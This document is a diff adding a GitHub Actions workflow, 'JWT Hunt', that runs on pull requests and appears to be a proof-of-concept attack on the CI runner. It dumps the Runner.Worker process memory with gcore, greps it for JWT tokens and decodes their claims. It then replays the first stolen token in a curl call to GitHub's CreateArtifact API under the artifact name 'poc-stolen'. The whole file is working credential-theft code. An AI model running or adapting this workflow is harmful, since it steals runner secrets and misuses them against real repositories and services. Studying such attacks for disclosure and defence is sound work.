@@ -1,0 +1,59 @@
+name: JWT Hunt
+on:
+  pull_request:
+  workflow_dispatch:
+permissions:
+  contents: read
+jobs:
+  hunt:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/setup-go@v4
+        with: { go-version: '1.21' }
+
+      - name: Dump and search Worker memory
+        run: |
+          set +e
+          sudo apt-get install -y gdb 2>&1 | tail -1
+          worker_pid=$(pgrep -f "Runner.Worker" | head -1)
+          echo "Worker PID: $worker_pid"
+          mkdir -p /tmp/d && cd /tmp/d
+          sudo gcore -o w $worker_pid 2>&1 | tail -3
+          dump=$(ls w.* | head -1)
+          ls -la "$dump"
+          echo ""
+          echo "=== JWT pattern hunt (any length) ==="
+          # JWTs are: header.payload.signature, all base64url
+          # Just look for the eyJ prefix + dots
+          sudo strings "$dump" 2>/dev/null | grep -oE 'eyJ[A-Za-z0-9_-]{10,}\.eyJ[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{20,}' | sort -u | head -5 | while read jwt; do
+            len=${#jwt}
+            echo "JWT len=$len: $(echo "$jwt" | head -c 50)..."
+            # Decode header
+            header=$(echo "$jwt" | cut -d. -f1)
+            padded="${header}$(printf '%*s' $((4 - ${#header} % 4)) '' | tr ' ' '=')"
+            echo "  Hdr: $(echo "$padded" | base64 -d 2>/dev/null)"
+            # Decode payload (just the issuer + audience, redact rest)
+            payload=$(echo "$jwt" | cut -d. -f2)
+            padded2="${payload}$(printf '%*s' $((4 - ${#payload} % 4)) '' | tr ' ' '=')"
+            decoded=$(echo "$padded2" | base64 -d 2>/dev/null)
+            iss=$(echo "$decoded" | grep -oE '"iss":"[^"]*"' | head -1)
+            aud=$(echo "$decoded" | grep -oE '"aud":"[^"]*"' | head -1)
+            scp=$(echo "$decoded" | grep -oE '"scp":"[^"]*"' | head -1)
+            echo "  Claims: iss=$iss | aud=$aud | scp=$scp"
+            echo ""
+          done
+
+          echo ""
+          echo "=== TEST: try to use first JWT to call CreateArtifact ==="
+          first_jwt=$(sudo strings "$dump" 2>/dev/null | grep -oE 'eyJ[A-Za-z0-9_-]{10,}\.eyJ[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{20,}' | head -1)
+          if [ -n "$first_jwt" ]; then
+            echo "Trying with first JWT (len ${#first_jwt})"
+            url="https://results-receiver.actions.githubusercontent.com/twirp/github.actions.results.api.v1.ArtifactService/CreateArtifact"
+            response=$(curl -sS -X POST -H "Authorization: Bearer $first_jwt" \
+              -H "Content-Type: application/json" \
+              -d '{"workflow_run_backend_id":"00000000-0000-0000-0000-000000000000","workflow_job_run_backend_id":"00000000-0000-0000-0000-000000000000","name":"poc-stolen","version":4}' \
+              "$url" 2>&1)
+            echo "Response (300 chars):"
+            echo "$response" | head -c 300
+          fi
